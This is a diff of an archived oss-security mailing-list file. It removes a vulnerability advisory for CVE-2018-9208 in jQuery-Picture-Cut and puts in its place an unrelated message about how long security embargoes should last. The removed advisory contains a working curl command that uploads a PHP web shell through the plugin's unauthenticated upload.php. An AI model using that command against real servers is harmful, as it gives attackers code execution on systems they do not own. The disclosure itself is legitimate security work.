@@ -1,33 +1,58 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/11/20/7
-Message-id: <89E9855C-DA89-4F14-88BB-81AD23B76A20@me.com>
-Date: Tue, 20 Nov 2018 17:05:41 -0500
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Security <oss-security@...ts.openwall.com>
-Subject: Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1beta
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/26/8
+Message-ID: <20180126193448.GA10683@openwall.com>
+Date: Fri, 26 Jan 2018 20:34:48 +0100
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: How to deal with reporters who don't want their bugs fixed?
 Content-Type: text/plain; charset=utf-8
 
-Title: Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1beta
-Author: Larry W. Cashdollar, @_larry0
-Date: 2018-11-02
-CVE-ID:CVE-2018-9208
-CWE: CWE-434 arbitrary file upload
-Download Site: https://github.com/TuyoshiVinicius/jQuery-Picture-Cut
-Vendor: http://picturecut.tuyoshi.com.br/
-Vendor Notified: 2018-11-03
-Vendor Contact: tuyoshi_vinicius@...mail.com
-Advisory: http://www.vapidlabs.com/advisory.php?v=207
+On Sat, Jan 20, 2018 at 09:18:25PM +0100, Florian Weimer wrote:
+> On 01/18/2018 10:21 PM, Solar Designer wrote:
+> >I think it's best for your project (I guess glibc?) to prominently
+> >publish near the security contact address a maximum embargo time you'd
+> >(be likely to) agree to.  That's what security at kernel.org does
+> >(7 days) and what we do with (linux-)distros (14 days).
+> 
+> I would prefer to be flexible in case something truly awful happens.
 
-Description: picture cut is a jquery plugin that handles images in a very friendly and simple way, with a beautiful interface based on bootstrap or jquery ui, has great features like ajax upload, drag image from explorer, image crop and others.
+As an option, you may state that your project will agree to embargoes of
+up to e.g. 14 days (as long as there's no leak, etc.), but at your sole
+discretion might agree to longer embargoes (ditto).
 
-Vulnerability:
-The code in jQuery-Picture-Cut/src/php/upload.php that calls ../core/PictureCut.php to handle the file upload does not check file type and allows the user to choose the file location path. An unauthenticated user and upload an executable PHP file to the server allowing code execution.
+> Your perspective is skewed because people know that you have a 
+> preference for short embargoes, so at least I tell people to make sure 
+> that they have a final patch before contacting the distros list.  Then a 
+> week or two is probably enough in most cases.  Without a patch, not so much.
 
-Exploit Code:
+As another option, you can state a longer maximum embargo for your
+project - e.g., 30 days - although that seems excessive to me.
 
-1. curl  -F  "inputOfFile=file" -F "request=upload" -F "enableResize=0" -F "minimumWidthToResize=0" -F "minimumHeightToResize=0" -F "folderOnServer=/" -F "imageNameRandom=1" -F "maximumSize=10000" -F "enableMaximumSize=0" -F "file=@...ll.php" http://example.com/jQuery-Picture-Cut/src/php/upload.php
+I understand that for complex or/and complicated issues it might take a
+lot of time to come up with what looks like a final fix, but as you
+point out below it might also be unrealistic to expect that fix to
+actually be final.  So maybe it's best not to even try, and instead to
+release non-invasive preliminary mitigations first (clearly calling them
+such), then work on cleaner and more complete fixes in public.
 
-3. With folderOnServer=/ the shell will be in the main web directory path.
+> On the other hand, it is near impossible to develop quality solutions 
+> under long embargoes.  We tried that in 2008 and largely failed.
 
+> >That way, it's
+> >less important for you to judge whether the reason for embargo is
+> >valid/altruistic or bogus/selfish - a sane maximum embargo time
+> >minimizes the damage to all parties either way.
+> 
+> That's not really true.  Depending on the nature of the vulnerability, 
+> there can be a lot of work before we're confident that we can ship an 
+> update.  We have some rather bad code out there, with very little or no 
+> test coverage, and if we modify such code, we really need to make sure 
+> that users receive a net improvement.  (For example, we thought we had 
+> the final patch for a DNS stub resolver issue, but it turned out very 
+> late that it had a crippling memory leak.)
 
+I think we're on the same page here.  This is a reason to avoid long
+embargoes, and in complex/complicated cases to avoid even trying to make
+the very first public updates "final".
 
+Alexander
